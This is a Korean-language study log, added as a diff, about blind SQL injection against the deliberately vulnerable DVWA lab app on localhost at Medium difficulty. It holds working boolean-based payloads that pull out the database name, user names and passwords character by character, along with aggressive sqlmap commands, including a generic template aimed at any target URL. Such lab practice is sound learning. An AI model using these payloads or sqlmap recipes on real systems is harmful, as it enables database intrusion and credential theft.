@@ -1,0 +1,198 @@
+🔐 [Blind SQL Injection - Medium] 난이도 특징
+🔎 동작 방식 요약
+GET 방식이 아니라 POST 방식으로 id 값을 받습니다.
+
+Blind 방식이라 참/거짓 결과만 판단 가능 (결과가 직접 안 보임)
+
+성공/실패는 페이지 내용이 바뀌는지 여부로 추측해야 합니다.
+
+mysql_real_escape_string 있는듯. 
+' 들어가면 바로 오류페이지 띄움 
+상세오류도 아니고 
+There was an error. 
+이거 한줄 띡 던져주는 오류
+
+
+ 해결책: 숫자 인젝션 시도
+sql
+
+id=1 AND 1=1   → 참  
+id=1 AND 1=2   → 거짓
+위처럼 ' 없이 숫자 기반으로 Blind SQLi 시도하면 mysql_real_escape_string()도 무력화됩니다.
+왜냐하면 이 함수는 문자열에만 적용되고, 정수형 파라미터에는 영향을 미치지 않기 때문이에요.
+
+**Blind SQL Injection (Blind SQLi)**에서 참/거짓을 구분할 수 있게 되었으면, 그다음 단계는 "참/거짓의 응답 차이"를 이용해서 정보를 한 글자씩 추출하는 것입니다. 이를 Boolean-based Blind SQL Injection이라고 해요.
+
+
+🎯 목표
+예: 첫 번째 유저의 user 값을 얻는다 → 'admin' 같은 값
+
+🧩 진행 흐름
+✅ 1단계: 문자 수 확인 (길이 확인)
+sql
+복사
+편집
+id=1 AND LENGTH((SELECT user FROM users LIMIT 0,1)) = 5
+→ 페이지가 정상 출력되면 길이가 5라는 뜻
+→ 계속 1~N까지 시도해서 길이를 알아냄
+
+✅ 2단계: 한 글자씩 비교 (SUBSTRING 사용)
+예를 들어 admin이라는 값을 알아내고 싶다면:
+
+sql
+복사
+편집
+id=1 AND SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)='a'
+→ 1번째 글자가 'a'인지 확인
+
+sql
+복사
+편집
+id=1 AND SUBSTRING((SELECT user FROM users LIMIT 0,1),2,1)='d'
+→ 2번째 글자가 'd'인지 확인
+
+이걸 반복해서 값을 완성할 수 있어요.
+
+🧠 좀 더 자동화된 방식 (대소비교 사용)
+sql
+복사
+편집
+id=1 AND ASCII(SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)) > 100
+→ ASCII 코드를 이용하면 **이진 탐색(binary search)**으로 문자 추출도 가능
+
+1: 기본 SQLMap 명령어
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID="f3bk7vpun31j47omipvavolhug" --batch
+
+✅ 이 명령어가 하는 일
+id=1 파라미터에 Blind SQL Injection이 가능한지 자동으로 테스트
+
+가능한 경우, 트루/폴스 기반으로 정보를 추출할 수 있는지 판단
+
+결과는 C:\Users\yuuki\AppData\Local\sqlmap\output\localhost 경로에 저장됨
+
+2: DB 이름 알아내기
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID="f3bk7vpun31j47omipvavolhug" --dbs --batch
+
+오류발생.
+[23:00:22] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
+[*] ending @ 23:00:22 /2025-05-26/
+
+이 메시지는 sqlmap이 자동으로 탐지한 모든 파라미터(id, Submit 등)가 SQL 인젝션에 취약하지 않다고 판단했다는 의미입니다. 하지만 다음의 이유로 실제로는 취약할 수 있음에도 실패했을 수 있습니다:
+
+🔎 원인 정리
+Blind SQL Injection은 참/거짓 여부만 반환하기 때문에 탐지 어려움
+
+There was an error. 또는 단순한 리디렉션 등 응답의 차이가 작아서 sqlmap이 판단하지 못함
+
+DVWA Medium 난이도에서는 mysql_real_escape_string() 사용
+
+일반적인 ' 단일 인젝션은 차단됨
+
+하지만 논리 연산자나 우회 기법은 여전히 통할 수 있음
+
+sqlmap이 충분히 깊이 테스트하지 않음
+
+기본 --level=1, --risk=1은 보수적이라 탐지 실패 가능성 있음
+
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=YOUR_SESSION_ID" -p id --level=5 --risk=3 --tamper=space2comment --dbs --batch
+
+
+sqlmap은 자동화된 SQL Injection 도구이기 때문에,
+당신이 대상 URL과 세션 쿠키 값만 제대로 주면,
+나머지는 거의 다 알아서 해줍니다.
+
+✅ 당신이 해야 할 최소한의 준비
+1. 🔗 취약한 URL
+예시:
+
+bash
+복사
+편집
+-u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
+2. 🍪 세션 쿠키
+예시:
+
+bash
+복사
+편집
+--cookie="security=medium; PHPSESSID=abcdef1234567890"
+(로그인 세션을 유지해야 접근이 가능하기 때문)
+
+🛠️ 추천 기본 명령어
+bash
+복사
+편집
+python sqlmap.py -u "http://your.target.com/page.php?id=1" \
+--cookie="PHPSESSID=세션값; security=low" \
+--batch \
+--level=5 \
+--risk=3 \
+--dbs
+--batch: 질문 없이 자동 진행
+
+--level=5 --risk=3: 가능한 모든 테스트 시도
+
+--dbs: 데이터베이스 목록 출력
+
+🧠 추가로 선택할 수 있는 것들
+목적	옵션
+현재 DB 사용자 확인	--current-user
+현재 DB 확인	--current-db
+테이블 보기	--tables -D db이름
+데이터 덤프	--dump -D db이름 -T 테이블이름
+암호 해시 가져오기	--passwords
+
+
+
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \ --cookie="security=medium; PHPSESSID=your_session_id" \ --level=5 --risk=3 \ --technique=B \ --tamper=space2comment \ --dbs \ --batch
+
+
+
+sqlmap 생각보다 오류가 많이 뜬다. 
+
+
+2025-05-27(화)
+특수문자 없이 Blind SQL Injection 하는 방법 (Medium)
+기본 원리 
+Medium 난이도는 ', ", --, # 같은 문자를 escape 하거나 막습니다.
+
+하지만 숫자형 데이터에 대한 비교 연산은 그대로 통과할 수 있습니다.
+
+👇 예제: 참과 거짓 테스트 (숫자 비교만 사용)
+✅ 참이 되는 경우
+http
+복사
+편집
+http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1 AND 1=1&Submit=Submit
+❌ 거짓이 되는 경우
+http
+복사
+편집
+http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1 AND 1=2&Submit=Submit
+이 두 요청에서 페이지의 응답이 다르다면, Blind SQLi 가능합니다.
+
+된다. 
+
+예제: 데이터 추출 (문자 인코딩 없이)
+📌 데이터베이스 이름의 첫 글자가 d인지 확인
+MySQL의 ASCII() 함수를 활용해서 우회할 수 있습니다.
+
+http
+
+?id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit
+d의 ASCII 값이 100이기 때문입니다.
+?id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=101&Submit=Submit
+
+응답 페이지가 참/거짓으로 다르면 성공.
+
+성공.
+
+자동화 없이 수동 반복 예시 (비밀번호 추출)
+
+http
+?id=1 AND ASCII(SUBSTRING(password,1,1))=97&Submit=Submit   ← 첫 글자가 a인지?
+?id=1 AND ASCII(SUBSTRING(password,1,1))=98&Submit=Submit   ← 첫 글자가 b인지?
+이런 식으로 반복하면서 글자 하나씩 추출합니다.
+
+암튼 수동으로 어찌저찌 되긴한다. 미디움까지 확인완료. 
